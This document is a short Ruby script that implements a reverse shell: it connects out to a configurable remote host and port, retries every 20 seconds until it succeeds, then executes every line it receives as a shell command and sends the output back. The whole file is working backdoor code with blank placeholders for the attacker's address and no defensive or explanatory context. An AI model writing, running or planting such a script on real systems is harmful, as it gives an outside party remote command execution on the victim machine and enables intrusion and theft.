require 'socket'
require 'etc'
require 'open3'

RHOST = ""  
PORT = ""


def rev()
    begin
        sock = TCPSocket.new "#{RHOST}", "#{PORT}"
        sock.puts "[\033[1;92m*\033[1;97m] Connected!"
        sock.print ">> "
        rescue
          sleep 20
          retry
        end
        
        begin
          while line = sock.gets
            Open3.popen2e("#{line}") do | stdin, stdout_and_stderr |
                      IO.copy_stream(stdout_and_stderr, sock)
                      end  
          end
        rescue
          retry
    end 
end

rev()
